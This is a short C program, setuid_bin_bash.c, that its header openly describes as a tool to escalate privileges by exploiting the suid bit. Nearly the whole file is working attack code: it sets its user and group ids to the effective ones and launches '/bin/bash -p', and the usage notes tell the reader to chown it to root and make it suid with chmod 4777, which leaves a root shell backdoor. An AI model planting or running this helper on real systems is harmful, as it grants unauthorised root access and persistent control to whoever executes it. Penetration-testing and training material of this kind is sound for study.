/********************************************************************
*    setuid_bin_bash.c -- program to execute bash as root
*
*    Author   : Re4son <re4son [at] whitedome.com.au
*    Purpose  : escalate privileges by exploiting suid bit
*    Usage    : chown to root and set suid bit
*               chmod 4777 /path/to/mix-suid
********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	char *envp[] = {NULL};
	char *argv[] = {"/bin/bash", "-p", NULL};
	setuid( geteuid() );
    	setgid( getegid() );

	printf("Executing Shell\n");
	execve("/bin/bash", argv, NULL);
	
	return 0;
}
